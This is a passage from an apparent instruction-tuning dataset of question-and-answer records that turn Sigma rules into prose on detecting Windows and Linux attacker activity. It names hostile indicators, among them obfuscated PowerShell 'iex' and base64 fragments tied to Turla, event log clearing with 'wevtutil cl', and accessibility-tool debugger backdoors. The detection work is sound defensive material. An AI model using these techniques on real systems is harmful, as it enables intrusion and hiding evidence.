      "answer": "In order to detect an adversary leveraging legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks, you should: Monitor for the creation of processes on Windows systems that are indicative of the GoTo Opener software. This involves looking for any process that has a description of \"GoTo Opener,\" is named \"GoTo Opener,\" and is associated with the company \"LogMeIn, Inc.\" It's important to note, however, that there may be legitimate uses of this software, so not all detections signify malicious activity but should be examined within the context of other suspicious activities on the network. The monitoring of such processes falls under the tactics of Execution, Persistence, and Privilege Escalation, as malicious actors may use the GoTo Opener as a method to execute commands, maintain persistent access, and potentially escalate their privileges within a target network."
    }
  },
  {
    "instruction": "How can I detect: commands used by Turla group as reported by ESET in May 2020",
    "context": "",
    "output": "In order to detect commands used by Turla group as reported by ESET in May 2020, you should: Monitor process creation logs on Windows systems for certain command-line activities that could indicate malicious activity. Specifically, look for the execution of commands which include using 'tracert' with a maximum of 10 hops to 'yahoo.com', any usage of PowerShell to execute encoded commands which might include '.WSqmCons))|iex;' or patterns suggesting decoding from base64 strings such as 'Fr`omBa`se6`4Str`ing'. Additionally, watch for commands that attempt to use 'net use' to connect to a suspicious URL 'https://docs.live.net' and contain '@aol.co.uk' within the same command. Any of these activities happening suggests an attempt to perform operations analogous to those of the Turla group, requiring immediate investigation. The criticality level of these signs is considered high due to the potential for significant malicious intents such as data theft, surveillance, or compromised system integrity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "commands used by Turla group as reported by ESET in May 2020",
      "answer": "In order to detect commands used by Turla group as reported by ESET in May 2020, you should: Monitor process creation logs on Windows systems for certain command-line activities that could indicate malicious activity. Specifically, look for the execution of commands which include using 'tracert' with a maximum of 10 hops to 'yahoo.com', any usage of PowerShell to execute encoded commands which might include '.WSqmCons))|iex;' or patterns suggesting decoding from base64 strings such as 'Fr`omBa`se6`4Str`ing'. Additionally, watch for commands that attempt to use 'net use' to connect to a suspicious URL 'https://docs.live.net' and contain '@aol.co.uk' within the same command. Any of these activities happening suggests an attempt to perform operations analogous to those of the Turla group, requiring immediate investigation. The criticality level of these signs is considered high due to the potential for significant malicious intents such as data theft, surveillance, or compromised system integrity."
    }
  },
  {
    "instruction": "How can I detect: usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
    "context": "",
    "output": "In order to detect the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen, you should focus on monitoring the creation of processes on Windows systems. Specifically, observe for events where the parent process is 'winlogon.exe' and the child process ends with commonly abused executables such as 'cmd.exe', 'cscript.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', 'regsvr32.exe', 'rundll32.exe', 'wscript.exe', or 'wt.exe'. Additionally, watch for command line executions that contain references to accessibility tools like 'sethc.exe', 'utilman.exe', 'osk.exe', 'Magnify.exe', 'Narrator.exe', or 'DisplaySwitch.exe'. These behaviors are critical to catch because they are highly indicative of an attacker installing a backdoor by registering malicious debuggers for Windows accessibility tools. This technique allows attackers to gain persistent access through the Windows login screen, which is a significant security concern. Given the unlikely probability of false positives, any occurrence should be treated with high urgency and investigated thoroughly. This detection strategy is grounded in understanding adversarial behaviors such as Persistence, Privilege Escalation, and Defense Evasion, aligning with tactics and techniques identified in the MITRE ATT&CK framework.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
      "answer": "In order to detect the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen, you should focus on monitoring the creation of processes on Windows systems. Specifically, observe for events where the parent process is 'winlogon.exe' and the child process ends with commonly abused executables such as 'cmd.exe', 'cscript.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', 'regsvr32.exe', 'rundll32.exe', 'wscript.exe', or 'wt.exe'. Additionally, watch for command line executions that contain references to accessibility tools like 'sethc.exe', 'utilman.exe', 'osk.exe', 'Magnify.exe', 'Narrator.exe', or 'DisplaySwitch.exe'. These behaviors are critical to catch because they are highly indicative of an attacker installing a backdoor by registering malicious debuggers for Windows accessibility tools. This technique allows attackers to gain persistent access through the Windows login screen, which is a significant security concern. Given the unlikely probability of false positives, any occurrence should be treated with high urgency and investigated thoroughly. This detection strategy is grounded in understanding adversarial behaviors such as Persistence, Privilege Escalation, and Defense Evasion, aligning with tactics and techniques identified in the MITRE ATT&CK framework."
    }
  },
  {
    "instruction": "Explain how should I detect the following: One of the Windows Eventlogs has been cleared. e.g. caused by \"wevtutil cl\" command execution",
    "context": "",
    "output": "In order to detect if one of the Windows Eventlogs has been cleared, possibly due to operations like the execution of the \"wevtutil cl\" command, you should monitor for specific event IDs in the Windows security logs. Look for events with the ID 517, which under the provider name \"Security\" indicate that an event log was cleared. Similarly, keep an eye out for event ID 1102 under the provider name \"Microsoft-Windows-Eventlog\". This event ID signifies that the audit log was cleared, which can be a critical sign of someone trying to hide their tracks after an attack or unauthorized changes.\n\nBe aware that there are instances where these event log clearances might not be malicious. Expected benign triggers include the rollout of log collection agents since setting these up can often involve resetting the local event log. Another non-malicious scenario is during system provisioning, where a system reset might occur before the creation of a 'golden' image for future deployments. Given the potential for these legitimate reasons causing event log clearances, such activity is marked with a high level of caution. \n\nThe detection of these activities should focus on Windows security services, leveraging the identifying features of the event IDs mentioned to signal possible malicious behavior. This type of monitoring is crucial as clearing event logs is a tactic used by adversaries to erase evidence of their presence and activities on a system, aligning with tactics and techniques that involve evasion and covering tracks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "One of the Windows Eventlogs has been cleared. e.g. caused by \"wevtutil cl\" command execution",
      "answer": "In order to detect if one of the Windows Eventlogs has been cleared, possibly due to operations like the execution of the \"wevtutil cl\" command, you should monitor for specific event IDs in the Windows security logs. Look for events with the ID 517, which under the provider name \"Security\" indicate that an event log was cleared. Similarly, keep an eye out for event ID 1102 under the provider name \"Microsoft-Windows-Eventlog\". This event ID signifies that the audit log was cleared, which can be a critical sign of someone trying to hide their tracks after an attack or unauthorized changes.\n\nBe aware that there are instances where these event log clearances might not be malicious. Expected benign triggers include the rollout of log collection agents since setting these up can often involve resetting the local event log. Another non-malicious scenario is during system provisioning, where a system reset might occur before the creation of a 'golden' image for future deployments. Given the potential for these legitimate reasons causing event log clearances, such activity is marked with a high level of caution. \n\nThe detection of these activities should focus on Windows security services, leveraging the identifying features of the event IDs mentioned to signal possible malicious behavior. This type of monitoring is crucial as clearing event logs is a tactic used by adversaries to erase evidence of their presence and activities on a system, aligning with tactics and techniques that involve evasion and covering tracks."
    }
  },
  {
    "instruction": "How to detect: file and folder permission changes.",
    "context": "",
    "output": "In order to detect file and folder permission changes, you should: Monitor logs generated by the Auditd service on Linux systems for execution (EXECVE) events where the command executed involves changing file or folder permissions or ownership. Specifically, look for instances where the command includes 'chmod' or 'chown', as these are indicative of attempts to modify the permissions or ownership of files and folders. It's important to note that changes to file and folder permissions and ownership are common in both benign and malicious activities. Therefore, occurrences of these commands might not always signify an attack, and can often be a part of regular system maintenance or user interactions with file permissions. Hence, while monitoring for these commands, it's essential to consider the context in which they are used to differentiate between normal behavior and potential security threats. The detection of such activities has been categorized with a low level of alert due to the possibility of false positives, which include regular user interactions with file permissions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "file and folder permission changes.",
      "answer": "In order to detect file and folder permission changes, you should: Monitor logs generated by the Auditd service on Linux systems for execution (EXECVE) events where the command executed involves changing file or folder permissions or ownership. Specifically, look for instances where the command includes 'chmod' or 'chown', as these are indicative of attempts to modify the permissions or ownership of files and folders. It's important to note that changes to file and folder permissions and ownership are common in both benign and malicious activities. Therefore, occurrences of these commands might not always signify an attack, and can often be a part of regular system maintenance or user interactions with file permissions. Hence, while monitoring for these commands, it's essential to consider the context in which they are used to differentiate between normal behavior and potential security threats. The detection of such activities has been categorized with a low level of alert due to the possibility of false positives, which include regular user interactions with file permissions."
    }
  },
  {
    "instruction": "Please help me detect the following: access to $ADMIN share",
    "context": "",
    "output": "Sure!\nIn order to detect access to $ADMIN share, you should look for specific events within Windows Security logs. Focus on events where the advanced audit policy regarding \"Object Access > Audit File Share\" is configured to log both success and failure instances. Specifically, keep an eye out for events with an ID of 5140, which indicates an attempt to access a file share. Moreover, it's essential to filter these events to include those accessing the \"Admin$\" share, a well-known default share used for administrative purposes in Windows systems.\n\nHowever, during this monitoring process, it's also important to apply certain filters to reduce false positives. One such filter involves ignoring events initiated by computer account names (which end in a '$' symbol). These are typically automated processes or services running on the network and are less likely to be related to unauthorized access attempts.\n\nIt's worth noting that while monitoring for this activity is critical, it's also expected to encounter legitimate administrative activities that match these criteria. Due to the nature of administrative tasks that might involve accessing the $ADMIN share, these events are categorized with a low level of alert. Therefore, any detection should be carefully analyzed to distinguish between malicious activities and necessary administrative operations.\n\nThis approach primarily aligns with the MITRE ATT&CK tactics and techniques related to Credential Access and Lateral Movement by monitoring attempts to access critical administrative shares on a network, which could indicate an attempt to escalate privileges or move laterally within the network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "access to $ADMIN share",
      "answer": "In order to detect access to $ADMIN share, you should look for specific events within Windows Security logs. Focus on events where the advanced audit policy regarding \"Object Access > Audit File Share\" is configured to log both success and failure instances. Specifically, keep an eye out for events with an ID of 5140, which indicates an attempt to access a file share. Moreover, it's essential to filter these events to include those accessing the \"Admin$\" share, a well-known default share used for administrative purposes in Windows systems.\n\nHowever, during this monitoring process, it's also important to apply certain filters to reduce false positives. One such filter involves ignoring events initiated by computer account names (which end in a '$' symbol). These are typically automated processes or services running on the network and are less likely to be related to unauthorized access attempts.\n\nIt's worth noting that while monitoring for this activity is critical, it's also expected to encounter legitimate administrative activities that match these criteria. Due to the nature of administrative tasks that might involve accessing the $ADMIN share, these events are categorized with a low level of alert. Therefore, any detection should be carefully analyzed to distinguish between malicious activities and necessary administrative operations.\n\nThis approach primarily aligns with the MITRE ATT&CK tactics and techniques related to Credential Access and Lateral Movement by monitoring attempts to access critical administrative shares on a network, which could indicate an attempt to escalate privileges or move laterally within the network."
    }
  },
  {
    "instruction": "Please help me detect the following: an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n",
    "context": "",
    "output": "Sure!\nIn order to detect an svchost process spawning an instance of an office application, which happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc., a method used by malicious actors to create malicious Office documents with macros on the fly, you should: Monitor the creation of processes on Windows systems, focusing on spotting instances where the 'svchost.exe' process, a legitimate Windows service host, is the parent process for launching office applications such as Word (winword.exe), Excel (excel.exe), PowerPoint (powerpnt.exe), Access (msaccess.exe), Publisher (mspub.exe), Equation Editor (eqnedt32.exe), or Visio (visio.exe). This activity is suspicious because 'svchost.exe' typically does not directly start Office applications, suggesting an abnormal use possibly tied to automation scripts. Be aware, however, that there can be benign instances where scripts or legitimate automated tasks do exactly this for office automation purposes, which are considered as potential false positives. The severity level for these observations is classified as medium, indicating a noteworthy but not definitive indication of malicious activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n",
      "answer": "In order to detect an svchost process spawning an instance of an office application, which happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc., a method used by malicious actors to create malicious Office documents with macros on the fly, you should: Monitor the creation of processes on Windows systems, focusing on spotting instances where the 'svchost.exe' process, a legitimate Windows service host, is the parent process for launching office applications such as Word (winword.exe), Excel (excel.exe), PowerPoint (powerpnt.exe), Access (msaccess.exe), Publisher (mspub.exe), Equation Editor (eqnedt32.exe), or Visio (visio.exe). This activity is suspicious because 'svchost.exe' typically does not directly start Office applications, suggesting an abnormal use possibly tied to automation scripts. Be aware, however, that there can be benign instances where scripts or legitimate automated tasks do exactly this for office automation purposes, which are considered as potential false positives. The severity level for these observations is classified as medium, indicating a noteworthy but not definitive indication of malicious activity."
    }
  },
  {
    "instruction": "How to detect: Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.\nSCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n",
    "context": "",
    "output": "In order to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell, which is often part of SCXcore used in Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite, you should monitor Linux system logs for process creation events. Specifically, look for instances where the process is initiated by the 'root' user with a Logon ID of '0' and the current directory is set to '/var/opt/microsoft/scx/tmp'. Additionally, the command line should contain '/bin/sh', indicating that the shell is being used to execute a command. It's important to be aware of legitimate uses of the SCX RunAsProvider Invoke_ExecuteShellCommand, as these can lead to false positives. This activity is considered to be of high importance due to its potential security implications, suggesting an attacker may be attempting to execute commands with high privileges in the context of the SCX environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.\nSCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n",
      "answer": "In order to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell, which is often part of SCXcore used in Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite, you should monitor Linux system logs for process creation events. Specifically, look for instances where the process is initiated by the 'root' user with a Logon ID of '0' and the current directory is set to '/var/opt/microsoft/scx/tmp'. Additionally, the command line should contain '/bin/sh', indicating that the shell is being used to execute a command. It's important to be aware of legitimate uses of the SCX RunAsProvider Invoke_ExecuteShellCommand, as these can lead to false positives. This activity is considered to be of high importance due to its potential security implications, suggesting an attacker may be attempting to execute commands with high privileges in the context of the SCX environment."
    }
  },
  {
    "instruction": "Can you explain how to detect: Detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network",
    "context": "",
    "output": "Certainly!\n\nIn order to detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network, you should: Focus on monitoring Windows security event logs for specific activities. Look for events with an ID of 4624, which indicates a successful account logon event. This event alone isn't unusual, but when it includes a Logon Type of 3, it points to a network logon, which is often used in lateral movement. Moreover, pay special attention when the logon event is associated with the process name ending in 'scrcons.exe'. This executable is related to WMI (Windows Management Instrumentation), and its involvement in a network logon event can indicate adversaries are executing scripts or commands remotely, possibly to move laterally within the network. However, be cautious with events where the TargetLogonId is '0x3e7' as these can be legitimate system activities and should not be considered in this detection logic to avoid false positives. Recognize that legitimate operations, like those performed by SCCM (System Center Configuration Manager), might generate similar events, thus they should be acknowledged as potential sources of false positives. The detection strategy is underpinned by MITRE ATT&CK tactics and techniques, notably those associated with lateral movement.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network",
      "answer": "In order to detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network, you should: Focus on monitoring Windows security event logs for specific activities. Look for events with an ID of 4624, which indicates a successful account logon event. This event alone isn't unusual, but when it includes a Logon Type of 3, it points to a network logon, which is often used in lateral movement. Moreover, pay special attention when the logon event is associated with the process name ending in 'scrcons.exe'. This executable is related to WMI (Windows Management Instrumentation), and its involvement in a network logon event can indicate adversaries are executing scripts or commands remotely, possibly to move laterally within the network. However, be cautious with events where the TargetLogonId is '0x3e7' as these can be legitimate system activities and should not be considered in this detection logic to avoid false positives. Recognize that legitimate operations, like those performed by SCCM (System Center Configuration Manager), might generate similar events, thus they should be acknowledged as potential sources of false positives. The detection strategy is underpinned by MITRE ATT&CK tactics and techniques, notably those associated with lateral movement."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious user agent strings used by crypto miners in proxy logs",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious user agent strings used by crypto miners in proxy logs, you should: Look into the proxy log sources for user agents beginning with specific patterns indicative of crypto-mining software. Focus on identifying any user agents that start with \"XMRig \" or \"ccminer\" as these are commonly associated with crypto mining activities. Ensure to meticulously collect data fields such as ClientIP, requested URI (c-uri), and the complete user agent string (c-useragent) for further analysis. It's important to be aware of the potential for unknown false positives, but given the high level of scrutiny required for such detections, the risk is deemed high. This method is tied to monitoring techniques and behaviors that relate to the use of system resources for unauthorized cryptocurrency mining.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious user agent strings used by crypto miners in proxy logs",
      "answer": "In order to detect suspicious user agent strings used by crypto miners in proxy logs, you should: Look into the proxy log sources for user agents beginning with specific patterns indicative of crypto-mining software. Focus on identifying any user agents that start with \"XMRig \" or \"ccminer\" as these are commonly associated with crypto mining activities. Ensure to meticulously collect data fields such as ClientIP, requested URI (c-uri), and the complete user agent string (c-useragent) for further analysis. It's important to be aware of the potential for unknown false positives, but given the high level of scrutiny required for such detections, the risk is deemed high. This method is tied to monitoring techniques and behaviors that relate to the use of system resources for unauthorized cryptocurrency mining."
    }
  },
  {
    "instruction": "How to detect: usage of the Sharp Chisel via the commandline arguments",
    "context": "",
    "output": "In order to detect usage of the Sharp Chisel via the commandline arguments, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\SharpChisel.exe' or where the product name is identified as 'SharpChisel'. Such an event is indicative of Sharp Chisel's execution. Given the context, this activity is highly suspicious and is unlikely to generate false positives, underlining its significance in identifying potential malicious behavior. The detection of this activity is crucial as it can point towards an attacker using Sharp Chisel for nefarious purposes, which is flagged at a high severity level due to its potential impact.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the Sharp Chisel via the commandline arguments",
      "answer": "In order to detect usage of the Sharp Chisel via the commandline arguments, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\SharpChisel.exe' or where the product name is identified as 'SharpChisel'. Such an event is indicative of Sharp Chisel's execution. Given the context, this activity is highly suspicious and is unlikely to generate false positives, underlining its significance in identifying potential malicious behavior. The detection of this activity is crucial as it can point towards an attacker using Sharp Chisel for nefarious purposes, which is flagged at a high severity level due to its potential impact."
    }
  },
  {
    "instruction": "How can I detect: suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT. This DLL location and name has been seen used by ColdSteel as the service DLL for its persistence mechanism\n",
    "context": "",
    "output": "In order to detect a suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT, you should: Monitor Windows image load events for instances where the 'svchost.exe' process is loading a DLL named 'newdev.dll' from a location within the user's AppData\\Roaming directory. Such behavior is indicative of a potential ColdSteel RAT infection, as this specific DLL location and name have been associated with the malware's persistence mechanism. Events matching these criteria should raise a high alert, as false positives are considered unlikely. This monitoring focuses on identifying techniques employed by the RAT for maintaining persistence and executing malicious code, related to the tactics of persistence and execution.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT. This DLL location and name has been seen used by ColdSteel as the service DLL for its persistence mechanism\n",
      "answer": "In order to detect a suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT, you should: Monitor Windows image load events for instances where the 'svchost.exe' process is loading a DLL named 'newdev.dll' from a location within the user's AppData\\Roaming directory. Such behavior is indicative of a potential ColdSteel RAT infection, as this specific DLL location and name have been associated with the malware's persistence mechanism. Events matching these criteria should raise a high alert, as false positives are considered unlikely. This monitoring focuses on identifying techniques employed by the RAT for maintaining persistence and executing malicious code, related to the tactics of persistence and execution."
    }
  },
  {
    "instruction": "Can you explain how to detect: stopping of a Windows service",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the stopping of a Windows service, you should: Monitor process creation events within the Windows operating system for instances where the executable or Image name ends with '\\sc.exe' or where the OriginalFileName attribute is precisely 'sc.exe'. This monitoring specifically targets detection of commands that include ' stop ' within the CommandLine, indicating an attempt to stop a Windows service. However, it's crucial to apply filtering to exclude known benign instances such as stopping the 'KSCWebConsoleMessageQueue' service associated with Kaspersky Security Center and the 'LGHUBUpdaterService' which relates to the Logitech LGHUB Updater. Additionally, commands executed by users with names containing variations of 'AUTHORI' or 'AUTORI' (covering different language settings) executing these specific stop commands should also be excluded to reduce false positives. Note that this detection emphasizes that the act of stopping services is not inherently suspicious and may have many legitimate reasons, suggesting a low level of alert and an understanding that the context of each event should be carefully considered to differentiate between benign activity and potential threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "stopping of a Windows service",
      "answer": "In order to detect the stopping of a Windows service, you should: Monitor process creation events within the Windows operating system for instances where the executable or Image name ends with '\\sc.exe' or where the OriginalFileName attribute is precisely 'sc.exe'. This monitoring specifically targets detection of commands that include ' stop ' within the CommandLine, indicating an attempt to stop a Windows service. However, it's crucial to apply filtering to exclude known benign instances such as stopping the 'KSCWebConsoleMessageQueue' service associated with Kaspersky Security Center and the 'LGHUBUpdaterService' which relates to the Logitech LGHUB Updater. Additionally, commands executed by users with names containing variations of 'AUTHORI' or 'AUTORI' (covering different language settings) executing these specific stop commands should also be excluded to reduce false positives. Note that this detection emphasizes that the act of stopping services is not inherently suspicious and may have many legitimate reasons, suggesting a low level of alert and an understanding that the context of each event should be carefully considered to differentiate between benign activity and potential threats."
    }
  },
  {
    "instruction": "How can I detect: Obfuscated Powershell via Stdin in Scripts",
    "context": "",
    "output": "In order to detect obfuscated PowerShell via Stdin in scripts, you should focus on monitoring the Windows System service logs, specifically looking for events generated by the Service Control Manager. Pay special attention to events with an ID of 7045 which involve the creation or modification of service entries in the system. These entries are crucial to identifying potential attack vectors.\n\nFor detection, it is essential to scrutinize the 'ImagePath' attribute of these events. The 'ImagePath' should contain certain patterns that are typically associated with obfuscation techniques used in PowerShell scripts. Specifically, look for instances where the 'ImagePath' contains the sequence 'set' followed by '&&', which is a common indicator of script obfuscation or command chaining. Additionally, the presence of keywords like 'environment', 'invoke', or 'input' within close proximity to these patterns further strengthens the suspicion of obfuscated PowerShell activities. These keywords are often used in techniques to obfuscate the script's intent or to execute commands indirectly, making them harder to detect by traditional means.\n\nIt is important to note that while this detection method is aimed at identifying obfuscated PowerShell usage, there may be instances where legitimate system actions trigger similar patterns, thus leading to potential false positives. Therefore, these events should be investigated thoroughly to distinguish between malicious activities and benign system operations.\n\nThis detection strategy relies heavily on understanding and identifying the subtle nuances of obfuscated scripts or commands, paying close attention to specific patterns and keywords within the 'ImagePath' field of relevant system events. Through meticulous monitoring and analysis of these indicators within the Windows System service logs, it is possible to identify and mitigate attempts to use obfuscated PowerShell via Stdin in scripts, thereby enhancing the security stance against such sophisticated attack techniques.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via Stdin in Scripts",
      "answer": "In order to detect obfuscated PowerShell via Stdin in scripts, you should focus on monitoring the Windows System service logs, specifically looking for events generated by the Service Control Manager. Pay special attention to events with an ID of 7045 which involve the creation or modification of service entries in the system. These entries are crucial to identifying potential attack vectors.\n\nFor detection, it is essential to scrutinize the 'ImagePath' attribute of these events. The 'ImagePath' should contain certain patterns that are typically associated with obfuscation techniques used in PowerShell scripts. Specifically, look for instances where the 'ImagePath' contains the sequence 'set' followed by '&&', which is a common indicator of script obfuscation or command chaining. Additionally, the presence of keywords like 'environment', 'invoke', or 'input' within close proximity to these patterns further strengthens the suspicion of obfuscated PowerShell activities. These keywords are often used in techniques to obfuscate the script's intent or to execute commands indirectly, making them harder to detect by traditional means.\n\nIt is important to note that while this detection method is aimed at identifying obfuscated PowerShell usage, there may be instances where legitimate system actions trigger similar patterns, thus leading to potential false positives. Therefore, these events should be investigated thoroughly to distinguish between malicious activities and benign system operations.\n\nThis detection strategy relies heavily on understanding and identifying the subtle nuances of obfuscated scripts or commands, paying close attention to specific patterns and keywords within the 'ImagePath' field of relevant system events. Through meticulous monitoring and analysis of these indicators within the Windows System service logs, it is possible to identify and mitigate attempts to use obfuscated PowerShell via Stdin in scripts, thereby enhancing the security stance against such sophisticated attack techniques."
    }
  },
  {
    "instruction": "How to detect: execution of the \"groupdel\" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks",
    "context": "",
    "output": "In order to detect execution of the \"groupdel\" binary, which is used to delete a group and is sometimes abused by threat actors in order to cover their tracks, you should focus on monitoring process creation logs from Linux systems. Specifically, watch for any processes that end with '/groupdel', as this indicates the execution of the groupdel binary. It is important to note that while this behavior can signify malicious activity, it may also represent legitimate administrator activities. The risk associated with this detection is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of the \"groupdel\" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks",
      "answer": "In order to detect execution of the \"groupdel\" binary, which is used to delete a group and is sometimes abused by threat actors in order to cover their tracks, you should focus on monitoring process creation logs from Linux systems. Specifically, watch for any processes that end with '/groupdel', as this indicates the execution of the groupdel binary. It is important to note that while this behavior can signify malicious activity, it may also represent legitimate administrator activities. The risk associated with this detection is considered medium."
    }
  },
  {
    "instruction": "Please help me detect the following: using SettingSyncHost.exe to run hijacked binary",
    "context": "",
    "output": "Sure!\nIn order to detect using SettingSyncHost.exe to run hijacked binary, you should: focus on monitoring process creation events within the Windows operating system. Specifically, analyze processes that are not initiated from the common system directories, C:\\Windows\\System32\\ or C:\\Windows\\SysWOW64\\. Instead, look for instances where the process parent command line includes 'cmd.exe /c' alongside 'RoamDiag.cmd' and the '-outputpath' argument. This unusual combination, especially not originating from standard system utilities, indicates that the SettingSyncHost.exe could be misused to execute unauthorized or hijacked binaries. Pay attention to fields such as TargetFilename and Image during the analysis. Despite the potential for unknown false positives, the severity of this behavior is considered high, implying its critical impact on security if detected.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "using SettingSyncHost.exe to run hijacked binary",
      "answer": "In order to detect using SettingSyncHost.exe to run hijacked binary, you should: focus on monitoring process creation events within the Windows operating system. Specifically, analyze processes that are not initiated from the common system directories, C:\\Windows\\System32\\ or C:\\Windows\\SysWOW64\\. Instead, look for instances where the process parent command line includes 'cmd.exe /c' alongside 'RoamDiag.cmd' and the '-outputpath' argument. This unusual combination, especially not originating from standard system utilities, indicates that the SettingSyncHost.exe could be misused to execute unauthorized or hijacked binaries. Pay attention to fields such as TargetFilename and Image during the analysis. Despite the potential for unknown false positives, the severity of this behavior is considered high, implying its critical impact on security if detected."
    }
  },
  {
    "instruction": "How can I detect: defence evasion attempt via odbcconf.exe execution to load DLL",
    "context": "",
    "output": "In order to detect defense evasion attempts via odbcconf.exe execution to load DLL, you should: \n\nMonitor Windows process creation logs for occurrences where odbcconf.exe or rundll32.exe are executed, specifically looking towards certain conditions. For the first set of conditions involving odbcconf.exe, check if the executable image path ends with '\\odbcconf.exe' and the original file name matches 'odbcconf.exe'. Additionally, inspect the command line arguments for the presence of '-a', '-f', '/a', '/f', or 'regsvr', which are indicators of suspicious activities often used in command line parameters for automation and DLL registration activities. \n\nIn another scenario, also look out for instances where the parent image path ends with '\\odbcconf.exe' indicating it initiated another process, particularly targeted at instances where the child process image path ends with '\\rundll32.exe' and the original filename is 'RUNDLL32.EXE'. Rundll32.exe execution following odbcconf might indicate attempts to load or execute a DLL for evasion purposes.\n\nBe aware of possible legitimate uses of odbcconf.exe by authorized users that might generate false positives at a medium level of alert. This involves understanding regular usage patterns within your specific environment to effectively differentiate between benign and malicious activities. \n\nThis approach targets the identification of techniques involving Defence Evasion through the process of DLL loading using odbcconf.exe, which aligns with recognized tactics and techniques documented in the cybersecurity framework.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "defence evasion attempt via odbcconf.exe execution to load DLL",
      "answer": "In order to detect defense evasion attempts via odbcconf.exe execution to load DLL, you should: \n\nMonitor Windows process creation logs for occurrences where odbcconf.exe or rundll32.exe are executed, specifically looking towards certain conditions. For the first set of conditions involving odbcconf.exe, check if the executable image path ends with '\\odbcconf.exe' and the original file name matches 'odbcconf.exe'. Additionally, inspect the command line arguments for the presence of '-a', '-f', '/a', '/f', or 'regsvr', which are indicators of suspicious activities often used in command line parameters for automation and DLL registration activities. \n\nIn another scenario, also look out for instances where the parent image path ends with '\\odbcconf.exe' indicating it initiated another process, particularly targeted at instances where the child process image path ends with '\\rundll32.exe' and the original filename is 'RUNDLL32.EXE'. Rundll32.exe execution following odbcconf might indicate attempts to load or execute a DLL for evasion purposes.\n\nBe aware of possible legitimate uses of odbcconf.exe by authorized users that might generate false positives at a medium level of alert. This involves understanding regular usage patterns within your specific environment to effectively differentiate between benign and malicious activities. \n\nThis approach targets the identification of techniques involving Defence Evasion through the process of DLL loading using odbcconf.exe, which aligns with recognized tactics and techniques documented in the cybersecurity framework."
    }
  },
  {
    "instruction": "How can I detect: execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate. As seen used by UNC4841 during their Barracuda ESG zero day exploitation.",
